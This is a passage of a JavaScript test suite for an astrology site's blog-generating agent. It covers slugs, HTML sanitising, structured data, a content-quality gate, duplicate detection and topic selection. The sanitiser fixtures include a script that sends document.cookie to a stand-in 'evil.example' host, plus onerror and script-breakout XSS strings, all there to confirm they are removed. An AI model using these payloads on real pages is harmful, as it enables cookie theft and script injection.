#!/usr/bin/env node
// ─────────────────────────────────────────────────────────────────────────────
// Offline verification of the blog agent's pure logic.
//
//   node scripts/testBlogAgent.js
//
// NO network, NO database, NO API keys. Everything here runs against fixtures,
// so it is safe anywhere and fast enough to run on every change.
//
// TWO RULES THIS SUITE FOLLOWS, both of them lessons CLAUDE.md records paying
// for more than once:
//
//  1. EVERY NEGATIVE CHECK IS PAIRED WITH A POSITIVE CONTROL. "the gate rejected
//     the bad article" proves nothing on its own — a gate that rejects
//     everything passes that test. So each rule is also shown ACCEPTING a good
//     article, which is what makes a false rejection visible.
//
//  2. IT ASSERTS ON WHAT THE CONSUMER RECEIVES, not on the helper. The HTML
//     checks parse the output and look for the tag or the href that a browser
//     would see; the JSON-LD check JSON.parses the emitted <script> block rather
//     than trusting that it was built correctly.
// ─────────────────────────────────────────────────────────────────────────────
const seo = require('../src/blogAgent/seo');
const quality = require('../src/blogAgent/quality');
const generate = require('../src/blogAgent/generate');
const topics = require('../src/blogAgent/topics');
const { parseJson } = require('../src/blogAgent/gemini');
const config = require('../src/blogAgent/config');

let pass = 0;
let fail = 0;
const failures = [];

function ok(name, cond, detail) {
  if (cond) { pass += 1; console.log(`  PASS  ${name}`); } else {
    fail += 1; failures.push(name);
    console.log(`  FAIL  ${name}${detail ? ` — ${detail}` : ''}`);
  }
}
function eq(name, actual, expected) {
  ok(name, actual === expected, `got ${JSON.stringify(actual)}, want ${JSON.stringify(expected)}`);
}
function section(t) { console.log(`\n── ${t} ──`); }

// ═══════════════════════════════════════════════════════════════════════════
// A known-good article. Built programmatically so the word count is a fact
// rather than a guess, and used as the positive control throughout.
// ═══════════════════════════════════════════════════════════════════════════
const KEYWORD = 'mangal dosh';

function goodArticle(overrides = {}) {
  // ~90 words of filler per paragraph, repeated to clear the 700-word floor.
  const filler = ('Saturn moves slowly through a chart and its lessons arrive on their own schedule rather '
    + 'than ours. A placement in the seventh house tends to delay a marriage instead of denying one, and '
    + 'the delay usually breaks once the relevant antardasha closes. Traditional texts describe the same '
    + 'pattern in several ways, which is why two astrologers can read one chart and emphasise different '
    + 'things without either being wrong. What matters in practice is the strength of the lord, the house '
    + 'it occupies and whether a benefic aspects it from elsewhere in the chart. ').repeat(3);

  const body = `<p>If you have been told you have ${KEYWORD}, the first thing worth knowing is that it is `
    + `far more common than it sounds, and Astrowani astrologers see it every day. ${filler}</p>`
    + `<h2>What ${KEYWORD} actually means</h2><p>${filler}</p>`
    + `<h2>How it shows up in a real life</h2><p>${filler}</p>`
    + `<ul><li>Check the house Mars occupies.</li><li>Check for a cancelling aspect.</li>`
    + `<li>Ask a verified astrologer on Astrowani to read the chart itself.</li></ul>`
    + `<h2>Remedies that are traditionally used</h2><p>${filler}</p>`
    + `<p>Astrowani keeps verified astrologers available by chat and call, and an Astrowani consultation `
    + `against your own birth details will always beat a general rule.</p>`;

  const bodyHi = ('<p>अगर आपको बताया गया है कि आपकी कुंडली में मंगल दोष है, तो सबसे पहले यह जानना '
    + 'ज़रूरी है कि यह बहुत आम है। शनि कुंडली में धीरे चलता है और उसके सबक अपने समय पर आते हैं। '
    + 'सातवें भाव में बैठा मंगल विवाह को रोकता नहीं, टालता है, और यह देरी सम्बन्धित अंतर्दशा के '
    + 'बाद खुल जाती है। परंपरागत ग्रंथ इसी बात को कई तरह से कहते हैं, इसलिए दो ज्योतिषी एक ही '
    + 'कुंडली पढ़कर अलग बातों पर ज़ोर दे सकते हैं और दोनों सही हो सकते हैं। Astrowani पर verified '
    + 'ज्योतिषी इसी तरह की कुंडली रोज़ देखते हैं।</p>').repeat(6)
    + '<h2>मंगल दोष का अर्थ</h2><p>व्यवहार में मंगल की स्थिति, भाव का स्वामी और शुभ ग्रह की दृष्टि '
    + 'सबसे ज़्यादा मायने रखती है। Astrowani पर आप अपनी कुंडली दिखाकर सीधा उत्तर ले सकते हैं।</p>';

  return {
    titleEn: `Mangal Dosh: What It Really Means`,
    titleHi: 'मंगल दोष: इसका वास्तविक अर्थ',
    metaDescription: 'Mangal dosh explained simply — what it means in your kundali, how serious it really is, '
      + 'when it cancels out, and the remedies astrologers actually use.',
    metaDescriptionHi: 'मंगल दोष क्या है, कुंडली में इसका असर कितना होता है, कब यह स्वतः समाप्त हो जाता है '
      + 'और ज्योतिषी कौन से उपाय बताते हैं — सरल भाषा में पूरी जानकारी।',
    excerpt: 'Mangal dosh is far more common and far less frightening than it sounds. Here is what it '
      + 'actually means in a kundali, and when it cancels out on its own.',
    excerptHi: 'मंगल दोष जितना डरावना लगता है, उतना है नहीं। जानिए कुंडली में इसका असली अर्थ क्या है।',
    imageQuery: 'temple oil lamp',
    imageAlt: 'A brass oil lamp burning in a temple, used in mangal dosh remedies',
    contentEn: body,
    contentHi: bodyHi,
    faqs: [
      { question: 'Is mangal dosh really a problem for marriage?', answer: 'It usually delays rather than denies. Much depends on the house Mars occupies and whether another planet cancels it.' },
      { question: 'Does mangal dosh ever cancel out by itself?', answer: 'Yes. There are several classical cancellations, including when both charts carry it and when Mars is in its own sign.' },
      { question: 'What remedies are traditionally advised?', answer: 'Tuesday fasting, Hanuman Chalisa and specific daan are the common ones. An astrologer should match the remedy to the chart.' },
    ],
    faqsHi: [
      { question: 'क्या मंगल दोष विवाह में सच में बाधा है?', answer: 'यह आमतौर पर विवाह को टालता है, रोकता नहीं। मंगल किस भाव में है यह ज़्यादा मायने रखता है।' },
      { question: 'क्या मंगल दोष स्वयं समाप्त हो सकता है?', answer: 'हाँ। कई शास्त्रीय स्थितियों में यह स्वतः समाप्त माना जाता है।' },
    ],
    ...overrides,
  };
}

const TOPIC = { key: 'mangal-dosh', title: 'Mangal Dosh', keyword: KEYWORD, category: 'Marriage' };
const LIMITS = quality.DEFAULT_LIMITS;

// ═══════════════════════════════════════════════════════════════════════════
section('slugify');
// ═══════════════════════════════════════════════════════════════════════════
eq('plain title', seo.slugify('Mangal Dosh: What It Really Means'), 'mangal-dosh-what-it-really-means');
eq('ampersand becomes "and"', seo.slugify('Rahu & Ketu'), 'rahu-and-ketu');
eq('apostrophe does not split a word', seo.slugify("Your Life's Path"), 'your-lifes-path');
eq('em dash and punctuation collapse', seo.slugify('Kitchen in the NORTH-EAST — Vastu'), 'kitchen-in-the-north-east-vastu');
eq('ordinals survive', seo.slugify('Mars in the 7th House'), 'mars-in-the-7th-house');
// Devanagari must NOT reach the URL — astrowani.com's one such sitemap entry is
// a 100-character percent-encoded string and is the point of this rule.
eq('devanagari is dropped, not encoded', seo.slugify('मंगल दोष क्या है'), 'astrowani-article');
eq('mixed script keeps only the ASCII', seo.slugify('Mangal Dosh मंगल दोष Explained'), 'mangal-dosh-explained');
ok('no slug contains a percent sign', !/%/.test(seo.slugify('मंगल & 50% Dosh')));
ok('empty input still yields a usable slug', seo.slugify('').length > 0);
const longSlug = seo.slugify('Saturn in the Seventh House in Capricorn and What It Means For Your Marriage And Career Prospects');
ok(`long title is truncated (${longSlug.length} chars)`, longSlug.length <= 72, longSlug);
ok('truncation does not leave a trailing hyphen', !/-$/.test(longSlug), longSlug);
ok('truncation does not cut mid-word', !longSlug.endsWith('-') && longSlug.split('-').every((w) => w.length > 0));

section('uniqueSlug');
eq('free slug is returned as-is', seo.uniqueSlug('mangal-dosh', new Set()), 'mangal-dosh');
eq('first collision gets -2', seo.uniqueSlug('mangal-dosh', new Set(['mangal-dosh'])), 'mangal-dosh-2');
eq('second collision gets -3', seo.uniqueSlug('mangal-dosh', new Set(['mangal-dosh', 'mangal-dosh-2'])), 'mangal-dosh-3');
ok('accepts an array as well as a Set', seo.uniqueSlug('a', ['a']) === 'a-2');

// ═══════════════════════════════════════════════════════════════════════════
section('sanitiseHtml — the model writes markup we do not trust');
// ═══════════════════════════════════════════════════════════════════════════
const dirty = generate.sanitiseHtml(
  '<p class="MsoNormal" style="color:red">Hello</p>'
  + '<script>fetch("https://evil.example/"+document.cookie)</script>'
  + '<img src=x onerror=alert(1)>'
  + '<iframe src="https://evil.example"></iframe>'
  + '<a href="https://spam.example">spam link</a>'
  + '<div onclick="steal()">text in a div</div>'
  + '<h2>Real heading</h2><h1>Competing heading</h1>'
  + '<!-- a comment -->'
  + '<svg><use href="#x"/></svg>'
  + '<strong>bold</strong><ul><li>item</li></ul>',
);
ok('script element and its body are gone', !/script|evil\.example/i.test(dirty), dirty);
ok('iframe is gone', !/iframe/i.test(dirty));
ok('img is gone', !/<img/i.test(dirty));
ok('svg is gone', !/<svg|<use/i.test(dirty));
ok('comment is gone', !/<!--/.test(dirty));
ok('model-written <a> is removed', !/<a\b|href=/i.test(dirty), dirty);
ok('every attribute is stripped (no class, style, onclick)', !/class=|style=|onclick=|onerror=/i.test(dirty), dirty);
ok('<p> survives', /<p>Hello<\/p>/.test(dirty), dirty);
ok('<h2> survives', /<h2>Real heading<\/h2>/.test(dirty));
ok('<h1> is unwrapped, text kept', !/<h1/i.test(dirty) && /Competing heading/.test(dirty), dirty);
ok('<div> is unwrapped, text kept', !/<div/i.test(dirty) && /text in a div/.test(dirty));
ok('<strong> and list survive', /<strong>bold<\/strong>/.test(dirty) && /<ul><li>item<\/li><\/ul>/.test(dirty));
// A positive control for the whole function: clean input must come back intact.
const cleanIn = '<p>One <strong>two</strong> three.</p><h2>Head</h2><ul><li>a</li></ul><table><tr><td>x</td></tr></table>';
eq('clean HTML passes through unchanged', generate.sanitiseHtml(cleanIn), cleanIn);
ok('markdown heading is repaired to <h3>', /<h3>Leftover<\/h3>/.test(generate.sanitiseHtml('## Leftover')));
ok('code fence is removed', !/```/.test(generate.sanitiseHtml('```html\n<p>x</p>\n```')));

// ═══════════════════════════════════════════════════════════════════════════
section('weaveInternalLinks');
// ═══════════════════════════════════════════════════════════════════════════
const woven = generate.weaveInternalLinks(
  '<p>Ask a verified astrologer on Astrowani about free kundali matching before you decide.</p>'
  + '<h2>Astrowani and your chart</h2><p>Astrowani is where people go for this.</p>',
  'Marriage',
  { max: 3 },
);
ok('links were placed', woven.linksPlaced >= 2, `placed ${woven.linksPlaced}`);
ok('every href is absolute and on the configured site', (woven.html.match(/href="([^"]+)"/g) || [])
  .every((h) => h.includes(seo.SITE_BASE)), woven.html);
ok('no nested anchors', !/<a[^>]*>[^<]*<a/i.test(woven.html), woven.html);
// A linked heading renders badly in both the website and the app, so headings
// must be left alone. This is the check that catches a greedy regex.
const headingPart = /<h2>(.*?)<\/h2>/.exec(woven.html);
ok('no link inside an <h2>', headingPart && !/<a\b/i.test(headingPart[1]), headingPart && headingPart[1]);
const anchorCount = (woven.html.match(/<a\b/gi) || []).length;
const closeCount = (woven.html.match(/<\/a>/gi) || []).length;
eq('anchors are balanced', anchorCount, closeCount);
ok('respects the max', anchorCount <= 3, `${anchorCount} anchors`);
// Negative control: nothing to link, nothing linked, and no crash.
const nothing = generate.weaveInternalLinks('<p>No brand name and no anchor phrase here at all.</p>', 'Marriage');
eq('no anchor phrase and no brand mention places no links', nothing.linksPlaced, 0);
ok('body is unchanged when nothing matches', nothing.html === '<p>No brand name and no anchor phrase here at all.</p>');
// The fallback path: only a bare brand mention is available.
const fallbackOnly = generate.weaveInternalLinks('<p>We think Astrowani is useful.</p>', 'Vastu');
ok('a bare "Astrowani" mention is linkable as a fallback', fallbackOnly.linksPlaced >= 1 && /<a[^>]*>Astrowani<\/a>/.test(fallbackOnly.html), fallbackOnly.html);

// ═══════════════════════════════════════════════════════════════════════════
section('JSON-LD structured data');
// ═══════════════════════════════════════════════════════════════════════════
const ldTag = seo.jsonLd({
  title: 'Mangal Dosh: What It Really Means',
  description: 'Mangal dosh explained simply.',
  slug: 'mangal-dosh-what-it-really-means',
  imageUrl: 'https://example.supabase.co/img.jpg',
  faqs: goodArticle().faqs,
  category: 'Marriage',
  publishedAt: '2026-10-13T00:00:00.000Z',
  keyword: KEYWORD,
});
const ldInner = /<script type="application\/ld\+json">([\s\S]*)<\/script>/.exec(ldTag);
ok('emits a single ld+json script tag', !!ldInner);
let ld = null;
try { ld = JSON.parse(ldInner[1]); ok('the payload is valid JSON', true); } catch (e) { ok('the payload is valid JSON', false, e.message); }
if (ld) {
  eq('@context is schema.org', ld['@context'], 'https://schema.org');
  const types = ld['@graph'].map((n) => n['@type']);
  ok('graph contains Article, BreadcrumbList and FAQPage', ['Article', 'BreadcrumbList', 'FAQPage'].every((t) => types.includes(t)), types.join(','));
  const article = ld['@graph'].find((n) => n['@type'] === 'Article');
  ok('Article headline is within 110 chars', article.headline.length <= 110);
  ok('Article has a publisher with a logo', !!article.publisher?.logo?.url);
  ok('Article image is an array', Array.isArray(article.image));
  eq('Article inLanguage', article.inLanguage, 'en-IN');
  const faqNode = ld['@graph'].find((n) => n['@type'] === 'FAQPage');
  eq('FAQPage carries every FAQ', faqNode.mainEntity.length, 3);
  ok('each FAQ has an acceptedAnswer with text', faqNode.mainEntity.every((q) => q.acceptedAnswer?.text?.length > 10));
  const crumbs = ld['@graph'].find((n) => n['@type'] === 'BreadcrumbList');
  eq('breadcrumb has 3 levels', crumbs.itemListElement.length, 3);
  ok('breadcrumb urls are absolute', crumbs.itemListElement.every((c) => /^https?:\/\//.test(c.item)));
}
// A FAQ answer containing "</script>" must not break out of the block — the one
// injection this element is actually exposed to.
const hostile = seo.jsonLd({
  title: 'T', description: 'd', slug: 's',
  faqs: [{ question: 'Q?', answer: 'close </script><script>alert(1)</script> here' }],
});
const hostileInner = /<script type="application\/ld\+json">([\s\S]*)<\/script>$/.exec(hostile);
ok('a </script> inside an answer cannot close the block', (hostile.match(/<script/gi) || []).length === 1, hostile);
ok('the hostile payload still parses', (() => { try { JSON.parse(hostileInner[1]); return true; } catch (_) { return false; } })());

// ═══════════════════════════════════════════════════════════════════════════
section('word counting ignores non-prose');
// ═══════════════════════════════════════════════════════════════════════════
// A JSON-LD block is thousands of characters. If it counted as prose, a thin
// article would pass the length gate on its own structured data.
const withLd = '<p>Five words of real prose.</p>' + ldTag;
eq('script content is excluded from the word count', seo.wordCount(withLd), 5);
eq('keyword inside JSON-LD does not satisfy the keyword check', seo.phraseCount(`<p>nothing here</p>${ldTag}`, KEYWORD), 0);
eq('entities are decoded before counting', seo.wordCount('<p>a&nbsp;b &amp; c</p>'), 4);

// ═══════════════════════════════════════════════════════════════════════════
section('quality gate — positive control FIRST');
// ═══════════════════════════════════════════════════════════════════════════
const good = goodArticle();
// stage:'draft' — a draft has no <a> tags because the prompt forbids them; the
// links are added by generate.assemble afterwards. See the stage note on
// quality.check: checking a draft for links rejected every article ever written.
const goodVerdict = quality.check(good, { keyword: KEYWORD, limits: LIMITS, existing: [], stage: 'draft' });
ok('a well-formed DRAFT is ACCEPTED', goodVerdict.ok, goodVerdict.rejections.join('; '));
ok(`  (${goodVerdict.stats.wordsEn} words, ${goodVerdict.stats.mentions} mentions, kw x${goodVerdict.stats.keywordHits} @ ${goodVerdict.stats.density}%)`, true);

// Each rule below must reject its own defect AND the control above must have
// passed, which together prove the rule discriminates rather than just refusing.
function rejects(name, overrides, code, opts = {}) {
  const v = quality.check(goodArticle(overrides), {
    keyword: KEYWORD, limits: LIMITS, existing: opts.existing || [], stage: opts.stage || 'draft',
  });
  const hit = v.rejections.some((r) => r.startsWith(code));
  ok(name, hit, `rejections: ${v.rejections.join('; ') || '(none)'}`);
}

rejects('too short is rejected', { contentEn: '<p>Short.</p><h2>a</h2><h2>b</h2><h2>c</h2>' }, 'TOO_SHORT_EN');
rejects('a title over 70 chars is rejected',
  { titleEn: 'Mangal Dosh And Everything You Could Possibly Want To Know About It Today' }, 'TITLE_TOO_LONG');
rejects('a missing Hindi title is rejected', { titleHi: '' }, 'TITLE_HI_MISSING');
rejects('too few H2s is rejected',
  { contentEn: goodArticle().contentEn.replace(/<h2>/g, '<p>').replace(/<\/h2>/g, '</p>') }, 'TOO_FEW_H2');
rejects('an <h1> in the body is rejected',
  { contentEn: `<h1>Competing</h1>${goodArticle().contentEn}` }, 'H1_IN_BODY');
rejects('too few FAQs is rejected', { faqs: [goodArticle().faqs[0]] }, 'TOO_FEW_FAQS');
rejects('a short meta description is rejected', { metaDescription: 'Too short.' }, 'META_LENGTH');
rejects('an over-long meta description is rejected', { metaDescription: 'x'.repeat(200) }, 'META_LENGTH');
rejects('an over-long excerpt is rejected', { excerpt: 'y'.repeat(400) }, 'EXCERPT_LENGTH');

section('quality gate — the brand rules the owner asked for');
rejects('fewer than 4 Astrowani mentions is rejected',
  { contentEn: goodArticle().contentEn.replace(/Astrowani/g, 'the platform') }, 'TOO_FEW_BRAND_MENTIONS');
rejects('brand stuffing is rejected',
  { contentEn: goodArticle().contentEn + '<p>' + 'Astrowani '.repeat(20) + '</p>' }, 'TOO_MANY_BRAND_MENTIONS');
// The spelling rule: "Astro Wani" and "Astrovani" are different search terms and
// splitting the brand's own mentions between them wastes every one of them.
for (const variant of ['Astro Wani', 'Astrovani', 'astro-wani', 'Astrowany', 'astro_wani']) {
  rejects(`"${variant}" is rejected as a brand misspelling`,
    { contentEn: goodArticle().contentEn.replace('Astrowani astrologers', `${variant} astrologers`) }, 'BRAND_MISSPELT');
}
ok('the correct spelling is NOT flagged', !quality.check(goodArticle(), { keyword: KEYWORD, limits: LIMITS, stage: 'draft' }).rejections.some((r) => r.startsWith('BRAND_MISSPELT')));
// Casing is a house-style issue, not an SEO one: "AstroWani" is the same token to
// a search engine, so it is normalised silently rather than rejected.
eq('generate.normaliseBrand fixes AstroWani', generate.normaliseBrand('Ask AstroWani today'), 'Ask Astrowani today');
eq('generate.normaliseBrand fixes ASTROWANI', generate.normaliseBrand('ASTROWANI astrologers'), 'Astrowani astrologers');
eq('generate.normaliseBrand fixes lowercase', generate.normaliseBrand('visit astrowani now'), 'visit Astrowani now');
eq('generate.normaliseBrand leaves a real misspelling alone (the gate must see it)', generate.normaliseBrand('Astro Wani'), 'Astro Wani');
ok('"AstroWani" alone is NOT rejected (same search token)',
  !quality.check(goodArticle({ contentEn: goodArticle().contentEn.replace('Astrowani astrologers', 'AstroWani astrologers') }),
    { keyword: KEYWORD, limits: LIMITS, stage: 'draft' }).rejections.some((r) => r.startsWith('BRAND_MISSPELT')));

section('quality gate — keywords');
rejects('a missing keyword is rejected',
  { contentEn: goodArticle().contentEn.replace(/mangal dosh/gi, 'the condition') }, 'KEYWORD_MISSING');
rejects('keyword stuffing is rejected',
  { contentEn: `<p>${`${KEYWORD} `.repeat(60)}</p>` + goodArticle().contentEn }, 'KEYWORD_STUFFED');
// The keyword has to be EARLY. This fixture has it only in the last paragraph.
const lateKeyword = goodArticle().contentEn.replace(
  new RegExp(KEYWORD, 'gi'), 'the condition',
).replace(/<\/p>$/, ` This is about ${KEYWORD} and ${KEYWORD}.</p>`);
rejects('a keyword absent from the opening is rejected', { contentEn: lateKeyword }, 'KEYWORD_NOT_IN_OPENING');

section('quality gate — content safety (the App Store rewording lesson)');
const banned = [
  ['a cancer cure claim', 'This gemstone cures cancer completely.'],
  ['a "replace medicine" claim', 'Wear this instead of medicine and skip the doctor.'],
  ['a stop-medication claim', 'You can stop taking your medication once the puja is done.'],
  ['a death claim', 'This kawach will prevent death in a critical condition.'],
  ['a guaranteed-pregnancy claim', 'This gives you guaranteed pregnancy within a year.'],
  ['a male-child promise', 'This puja will give you a son without fail.'],
  ['a guaranteed-wealth claim', 'This yantra brings guaranteed wealth to the house.'],
  ['a lottery claim', 'Wear it for guaranteed lottery returns.'],
  ['black magic', 'Our black magic specialist will fix this for you.'],
  ['vashikaran', 'A vashikaran remedy brings the person back.'],
  ['a caste reference', 'People of low caste should avoid this muhurat.'],
  ['a daughter-is-unlucky claim', 'It is inauspicious to have a girl in this nakshatra.'],
];
for (const [name, sentence] of banned) {
  rejects(`${name} is rejected`, { contentEn: `${goodArticle().contentEn}<p>${sentence}</p>` }, 'BANNED_CLAIM');
}
// THE CONTROL THAT MATTERS: legitimate astrology vocabulary that merely sits near
// these topics must still pass, or the agent silently stops writing about health,
// money and marriage at all.
const legitimate = [
  'Traditional texts link the sixth house to everyday wellbeing and routine.',
  'Many people wear a gemstone for confidence; it is not a medical treatment.',
  'Saturn periods often coincide with slower financial growth rather than loss.',
  'A remedy supports a mindset; always follow your doctor for anything medical.',
  'The seventh house is read for marriage and partnership.',
];
for (const sentence of legitimate) {
  const v = quality.check(goodArticle({ contentEn: `${goodArticle().contentEn}<p>${sentence}</p>` }), { keyword: KEYWORD, limits: LIMITS, stage: 'draft' });
  ok(`legitimate sentence passes: "${sentence.slice(0, 44)}…"`, !v.rejections.some((r) => r.startsWith('BANNED_CLAIM')), v.rejections.join('; '));
}

section('quality gate — model scaffolding must never reach a reader');
for (const [name, text] of [
  ['a bracket placeholder', '[insert conclusion here]'],
  ['a TODO', 'TODO: add remedies'],
  ['an "as an AI" leak', 'As an AI I cannot verify this.'],
  ['a refusal leak', "I cannot write about this topic."],
  ['a preamble leak', "Here's the article you requested:"],
  ['an unfilled template', 'Welcome to {{ platform }}.'],
  ['a word-count annotation', 'Word count: 1200'],
]) {
  rejects(`${name} is rejected`, { contentEn: `${goodArticle().contentEn}<p>${text}</p>` }, 'SCAFFOLD_LEAKED');
}

section('quality gate — Hindi must actually be Hindi');
// The real failure: a loaded model returns the English body again for contentHi.
// Nothing downstream notices, and the app's Hindi toggle quietly shows English —
// precisely the bug src/autoTranslate.js exists to fix.
rejects('English text in the Hindi field is rejected',
  { contentHi: goodArticle().contentEn }, 'HINDI_NOT_HINDI');
rejects('transliterated Hindi (Latin script) is rejected',
  { contentHi: '<p>' + 'Mangal dosh ka arth yah hai ki aapki kundali mein mangal ashubh sthan par hai. '.repeat(12) + '</p>' }, 'HINDI_NOT_HINDI');
ok('genuine Devanagari passes', !quality.check(goodArticle(), { keyword: KEYWORD, limits: LIMITS, stage: 'draft' }).rejections.some((r) => r.startsWith('HINDI_NOT_HINDI')));

section('near-duplicate detection');
eq('a text is identical to itself', Number(quality.similarity('a b c d e f g h', 'a b c d e f g h').toFixed(2)), 1);
ok('unrelated texts barely overlap',
  quality.similarity('the kitchen should face south east for vastu reasons here',
    'tarot reversed cards mean a blocked energy in the reading') < 0.05);
// Republishing the same body under a new title must be caught.
const dupVerdict = quality.check(goodArticle(), {
  keyword: KEYWORD, limits: LIMITS, stage: 'draft',
  existing: [{ title: 'An earlier post', text: goodArticle().contentEn }],
});
ok('a near-copy of an existing post is rejected', dupVerdict.rejections.some((r) => r.startsWith('NEAR_DUPLICATE')), dupVerdict.rejections.join('; '));
// Control: a genuinely different article against the same corpus must pass.
const differentVerdict = quality.check(goodArticle(), {
  keyword: KEYWORD, limits: LIMITS, stage: 'draft',
  existing: [{ title: 'Vastu for the kitchen', text: '<p>' + 'The kitchen belongs in the south east corner and the cook should face east while cooking. '.repeat(30) + '</p>' }],
});
ok('a different article against the same corpus is ACCEPTED', differentVerdict.ok, differentVerdict.rejections.join('; '));

// ═══════════════════════════════════════════════════════════════════════════
section('the draft/final stage split');
// ═══════════════════════════════════════════════════════════════════════════
// THE REGRESSION THIS GUARDS: the first version checked the link count on the
// draft, while the prompt forbids the model from writing links. Every article was
// rejected on TOO_FEW_LINKS, so the agent could never have published anything.
const draftNoLinks = quality.check(goodArticle(), { keyword: KEYWORD, limits: LIMITS, stage: 'draft' });
ok('a link-free DRAFT is accepted', draftNoLinks.ok, draftNoLinks.rejections.join('; '));
eq('  and it genuinely has no links', draftNoLinks.stats.internalLinks, 0);
const finalNoLinks = quality.check(goodArticle(), { keyword: KEYWORD, limits: LIMITS, stage: 'final' });
ok('the same link-free article is REJECTED as final', finalNoLinks.rejections.some((r) => r.startsWith('TOO_FEW_LINKS')), finalNoLinks.rejections.join('; '));
// And the reverse: a model that smuggled an <a> past the sanitiser is caught,
// because that would be an invented URL reaching a reader.
const draftWithLink = quality.check(
  goodArticle({ contentEn: goodArticle().contentEn + '<p><a href="https://invented.example">link</a></p>' }),
  { keyword: KEYWORD, limits: LIMITS, stage: 'draft' },
);
ok('a DRAFT containing a model-written link is rejected', draftWithLink.rejections.some((r) => r.startsWith('MODEL_WROTE_LINKS')), draftWithLink.rejections.join('; '));

// ═══════════════════════════════════════════════════════════════════════════
section('assemble — what actually gets published');
// ═══════════════════════════════════════════════════════════════════════════
const assembled = generate.assemble(goodArticle(), {
  topic: TOPIC, slug: 'mangal-dosh-what-it-really-means',
  imageUrl: 'https://example.supabase.co/img.jpg', imageAlt: 'alt',
  related: [{ title: 'Kundali Milan', slug: 'kundali-milan' }, { title: 'Nadi Dosh', slug: 'nadi-dosh' }],
  publishedAt: '2026-10-13T00:00:00.000Z',
});
ok('the FAQ section is rendered visibly, not only as markup',
  /Frequently asked questions/.test(assembled.contentEn) && /Is mangal dosh really a problem/.test(assembled.contentEn));
ok('related posts are linked by slug',
  assembled.contentEn.includes('blog-post.html?slug=kundali-milan'), 'no related link');
ok('the CTA is appended', /Talk it through with an astrologer on Astrowani/.test(assembled.contentEn));
ok('the Play Store link is present and correct',
  assembled.contentEn.includes('play.google.com/store/apps/details?id=com.astrowanicustomer'));
ok('JSON-LD is appended to the English body', /application\/ld\+json/.test(assembled.contentEn));
// The Hindi body must NOT carry a second @graph: one URL serves both languages
// (style.css .lang-en/.lang-hi), so two Article nodes would be conflicting markup.
ok('the Hindi body carries NO JSON-LD', !/application\/ld\+json/.test(assembled.contentHi), 'hindi has ld+json');
ok('the Hindi body has its own Hindi CTA', /Astrowani se baat kijiye/.test(assembled.contentHi));
ok('the Hindi body has a Hindi FAQ heading', /Aksar pooche jaane wale sawal/.test(assembled.contentHi));
const asmVerdict = quality.check(assembled, { keyword: TOPIC.keyword, limits: LIMITS, existing: [], stage: 'final' });
ok('the ASSEMBLED article still passes the gate', asmVerdict.ok, asmVerdict.rejections.join('; '));
ok(`  assembled: ${asmVerdict.stats.wordsEn} words, ${asmVerdict.stats.mentions} mentions, ${asmVerdict.stats.internalLinks} links`, true);
ok('assembly ADDED links (the draft had none)', asmVerdict.stats.internalLinks >= LIMITS.minInternalLinks,
  `${asmVerdict.stats.internalLinks} links`);
ok('assembly did not push brand mentions over the cap', asmVerdict.stats.mentions <= LIMITS.maxAstrowaniMentions);
ok('assembly did not push keyword density over the cap', asmVerdict.stats.density <= LIMITS.maxKeywordDensity,
  `${asmVerdict.stats.density}%`);
// No anchor may be left unbalanced after three separate HTML blocks are concatenated.
eq('anchors balanced in the final English body',
  (assembled.contentEn.match(/<a\b/gi) || []).length, (assembled.contentEn.match(/<\/a>/gi) || []).length);
eq('anchors balanced in the final Hindi body',
  (assembled.contentHi.match(/<a\b/gi) || []).length, (assembled.contentHi.match(/<\/a>/gi) || []).length);

// ═══════════════════════════════════════════════════════════════════════════
section('topic catalogue');
// ═══════════════════════════════════════════════════════════════════════════
const cat = topics.catalogueSize();
ok(`catalogue holds ${cat.total} topics (${cat.seeds} curated + ${cat.generated} generated)`, cat.total > 2000);
ok(`that is ${(cat.total / 3 / 365).toFixed(1)} years at 3 a day`, cat.total / 3 / 365 > 2);
// Every key must be unique, or the ledger's dedup silently loses topics.
const allKeys = new Set(topics.SEED_TOPICS.map((t) => t.key));
eq('curated keys are unique', allKeys.size, topics.SEED_TOPICS.length);
const genKeys = new Set();
for (let i = 0; i < cat.generated; i += 1) genKeys.add(topics.familyTopic(i).key);
eq('generated keys are unique', genKeys.size, cat.generated);
let overlap = 0;
for (const k of genKeys) if (allKeys.has(k)) overlap += 1;
eq('curated and generated keys do not collide', overlap, 0);
// Every topic must be publishable: a keyword, a title and a known category.
const knownCategories = new Set(Object.values(topics.CATEGORIES));
let badTopic = null;
for (let i = 0; i < cat.generated && !badTopic; i += 1) {
  const t = topics.familyTopic(i);
  if (!t.title || !t.keyword || !knownCategories.has(t.category) || !t.key) badTopic = t;
}
ok('every generated topic has a title, keyword and known category', !badTopic, JSON.stringify(badTopic));
for (const t of topics.SEED_TOPICS) {
  if (!knownCategories.has(t.category)) { ok(`curated topic "${t.key}" has a known category`, false, t.category); break; }
}
ok('every curated topic has a known category', topics.SEED_TOPICS.every((t) => knownCategories.has(t.category)));
// The slug of every topic title must be usable as a URL.
ok('every curated title produces a non-empty ASCII slug',
  topics.SEED_TOPICS.every((t) => /^[a-z0-9-]+$/.test(seo.slugify(t.title))));

// The real test: simulate running for years and assert on repeats.
const used = new Set();
let dupes = 0;
let dryDay = null;
for (let day = 0; day < 1000; day += 1) {
  const picked = topics.pickTopics(3, used, { usedCount: used.size });
  if (picked.length < 3) { dryDay = day; break; }
  for (const t of picked) { if (used.has(t.key)) dupes += 1; used.add(t.key); }
}
eq('no topic repeats across the whole catalogue', dupes, 0);
ok(`runs ${dryDay || 1000}+ days before exhausting the catalogue`, (dryDay || 1000) > 700, `dry at day ${dryDay}`);
ok('pickTopics skips a key already used', !topics.pickTopics(1, new Set(['shani-sade-sati']))[0].key.includes('shani-sade-sati'));
// Exhaustion must be reported, not papered over by repeating.
const everything = new Set([...allKeys, ...genKeys]);
eq('an exhausted catalogue returns nothing rather than a repeat', topics.pickTopics(1, everything).length, 0);
// Curated topics must come before generated ones — they are the ones with volume.
eq('the first pick is a curated topic', topics.pickTopics(1, new Set())[0].source, 'seed');

// ═══════════════════════════════════════════════════════════════════════════
section('gemini reply parsing — models do not always obey');
// ═══════════════════════════════════════════════════════════════════════════
eq('plain JSON', parseJson('{"a":1}').a, 1);
eq('fenced JSON', parseJson('```json\n{"a":2}\n```').a, 2);
eq('fenced without a language tag', parseJson('```\n{"a":3}\n```').a, 3);
eq('a conversational preamble is stripped', parseJson('Sure! Here is the JSON:\n{"a":4}').a, 4);
eq('a trailing comma is repaired', parseJson('{"a":5,}').a, 5);
eq('nested HTML with braces survives', parseJson('{"contentEn":"<p>a {b} c</p>"}').contentEn, '<p>a {b} c</p>');
ok('unparseable input throws rather than returning junk', (() => {
